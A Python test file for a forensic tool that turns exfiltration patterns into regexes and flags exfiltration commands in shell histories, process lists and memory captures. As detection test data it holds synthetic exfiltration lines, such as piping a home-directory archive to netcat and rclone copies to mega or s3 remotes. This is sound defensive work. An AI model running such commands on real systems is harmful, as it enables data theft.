"""LOLExfil patterns -> regexes -> exfil_commands, from every source (v0.7.101).

All command lines are synthetic."""

import csv
import json
import logging
import re
from pathlib import Path

import yaml

from artifact_engine.config import DATA_DIR
from artifact_engine.core import lol_exfil as X
from artifact_engine.core.runner import ParserContext
from artifact_engine.handlers import _exfil


def _rx(pattern):
    r = X.to_regex(pattern)
    return None if r is None else re.compile(r, re.IGNORECASE)


def test_a_bare_program_name_matches_with_its_path_and_exe():
    rx = _rx("rclone copy * sftp:*|s3:*|mega:*")
    assert rx.search(r"C:\Tools\rclone.exe copy C:\Data mega:backup")
    assert rx.search("rclone copy /data s3:bucket")
    assert not rx.search("rclone copy /data local:dir")          # not one of the remotes
    assert not rx.search("notrclone copy /data mega:x")          # whole word only


def test_token_alternatives_and_the_shells_pipe():
    assert _rx("curl * paste.rs|ix.io|termbin.com").search("curl -F f=@x https://ix.io")
    pipe = _rx("*tar * | nc * (archive pipe to netcat)")      # comment dropped
    assert pipe.search("tar czf - /home | nc 10.0.0.5 4444")
    assert not pipe.search("tar czf out.tgz /home")


def test_a_unc_destination_matches_literally():
    rx = _rx("robocopy*\\\\*\\*")
    assert rx.search("robocopy D:\\data \\\\nas\\share /MIR")
    assert not rx.search("robocopy D:\\data E:\\copy")


def test_prose_and_tiny_patterns_are_left_out():
    assert X.to_regex("PROPFIND|PUT|MKCOL via script to external WebDAV") is None
    assert X.to_regex("*.py script with requests|urllib and external URL") is None
    assert X.to_regex("*ICMP(type=8)*load=* OR *IP(dst=*)/ICMP()*") is None
    assert X.to_regex("*a*") is None


def test_scan_keeps_the_most_telling_match_per_tool():
    pats = [({"tool": "rclone", "detect_type": "tool_execution", "pattern": "rclone*"},
             re.compile(X.to_regex("rclone*"), re.IGNORECASE)),
            ({"tool": "rclone", "detect_type": "exfil_action", "pattern": "rclone copy * mega:*"},
             re.compile(X.to_regex("rclone copy * mega:*"), re.IGNORECASE))]
    rows = _exfil.scan([("h", "jdoe", "rclone copy /d mega:x"), ("h", "jdoe", "rclone version"),
                        ("h", "jdoe", "")], pats)
    assert [(r[0], r[2], r[6]) for r in rows] == [
        ("high", "exfil_action", "rclone copy /d mega:x"),
        ("low", "tool_execution", "rclone version")]


def test_the_bundled_patterns_compile_and_stay_quiet_on_ordinary_lines():
    pats = _exfil.load(DATA_DIR / "assets")
    assert len(pats) > 500
    ordinary = [r"C:\Windows\system32\svchost.exe -k netsvcs -p",
                r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer',
                r"C:\Windows\explorer.exe", r"C:\Windows\System32\cmd.exe /c dir",
                "powershell -NoProfile Get-ChildItem C:\\Users", "/usr/sbin/sshd -D",
                "/bin/bash", "ls -la /var/log", "systemctl status nginx"]
    assert _exfil.scan((("t", "x", c) for c in ordinary), pats) == []


def _ctx(evidence: Path, out: Path, volume="live") -> ParserContext:
    return ParserContext(evidence=evidence, out=out, tools=evidence, assets=DATA_DIR / "assets",
                         machine_name="HOST-01", volume=volume, log=logging.getLogger("aeng.test"))


def _read(out: Path) -> list[dict]:
    p = out / _exfil.TABLE
    if not p.is_file():
        return []
    with open(p, encoding="utf-8", newline="") as fh:
        return list(csv.DictReader(fh))


def test_windows_history_and_liveresponse(tmp_path):
    from artifact_engine.handlers import win_exfil_commands as W
    hist = (tmp_path / "Users" / "jdoe" / "AppData" / "Roaming" / "Microsoft" / "Windows"
            / "PowerShell" / "PSReadLine")
    hist.mkdir(parents=True)
    (hist / "ConsoleHost_history.txt").write_text(
        "Get-Date\nrclone.exe copy C:\\Finance mega:loot\n", encoding="utf-8")
    res = tmp_path / "Velociraptor" / "LiveResponse" / "results"
    res.mkdir(parents=True)
    (res / "Eiffel.LiveResponse.Windows%2FWindows.System.Pslist.json").write_text(
        json.dumps({"Pid": 900, "Name": "rclone.exe",
                    "CommandLine": "rclone.exe sync D:\\share remote:bucket"}), encoding="utf-8")
    out = tmp_path / "out"
    W.run(_ctx(tmp_path, out))
    rows = {(r["source"], r["severity"]) for r in _read(out)}
    assert rows == {("powershell_history", "high"), ("liveresponse_process", "medium")}
    # a VSS snapshot reads its own history, never the live host's processes
    out2 = tmp_path / "out2"
    W.run(_ctx(tmp_path, out2, volume="VSS3"))
    assert {r["source"] for r in _read(out2)} == {"powershell_history"}


def test_linux_history_and_ps(tmp_path):
    from artifact_engine.handlers import lin_exfil_commands as L
    home = tmp_path / "[root]" / "home" / "jdoe"
    home.mkdir(parents=True)
    (home / ".bash_history").write_text("ls\nrclone copy /srv mega:x\n", encoding="utf-8")
    ps = tmp_path / "live_response" / "process"
    ps.mkdir(parents=True)
    (ps / "ps_-axo_pid_user_lstart_args.txt").write_text(
        "  PID USER STARTED COMMAND\n"
        "   77 jdoe Tue May 26 16:08:00 2026 rclone sync /srv s3:bucket\n", encoding="utf-8")
    out = tmp_path / "out"
    L.run(_ctx(tmp_path, out))
    assert {(r["source"], r["who"]) for r in _read(out)} == {
        ("bash_history", "jdoe"), ("uac_process", "pid 77 jdoe")}


def test_memory_rows_become_alerts(tmp_path):
    from artifact_engine.handlers import mem_exfil_commands as M
    from artifact_engine.handlers import mem_findings as F
    unit = tmp_path / "HOST-01_memory"
    mem = unit / "CSVs" / "Memory"
    mem.mkdir(parents=True)

    def table(name, header, rows):
        with open(mem / f"{name}.csv", "w", encoding="utf-8", newline="") as fh:
            w = csv.writer(fh)
            w.writerow(header)
            w.writerows(rows)

    table("mem_pslist", ["TreeDepth", "PID", "PPID", "ImageFileName", "Offset(V)", "Threads",
                         "Handles", "SessionId", "Wow64", "CreateTime", "ExitTime"],
          [[0, 4, 0, "System", "0x1", 1, 1, 0, "False", "", "N/A"],
           [0, 700, 4, "rclone.exe", "0x2", 1, 1, 1, "False", "", "N/A"]])
    table("mem_cmdline", ["TreeDepth", "PID", "Process", "Args"],
          [[0, 700, "rclone.exe", "rclone.exe copy C:\\Data mega:x"]])
    M.run(_ctx(unit, mem))                               # where mem_findings reads it from
    rows = _read(mem)
    assert [(r["who"], r["severity"]) for r in rows] == [("pid 700 rclone.exe", "high")]
    out = tmp_path / "out"
    F.run(_ctx(unit, out))
    with open(out / "mem_alerts.csv", encoding="utf-8", newline="") as fh:
        alerts = [a for a in csv.DictReader(fh) if a["rule"] == "exfil_command"]
    assert [(a["pid"], a["severity"]) for a in alerts] == [("700", "high")]


def test_the_bundled_asset_is_the_generators_output_shape():
    data = yaml.safe_load((DATA_DIR / "assets" / X.ASSET).read_text(encoding="utf-8"))
    for e in data["patterns"]:
        assert set(e) == {"tool", "category", "detect_type", "purpose", "pattern", "regex"}
        assert e["detect_type"] in X.SEVERITY
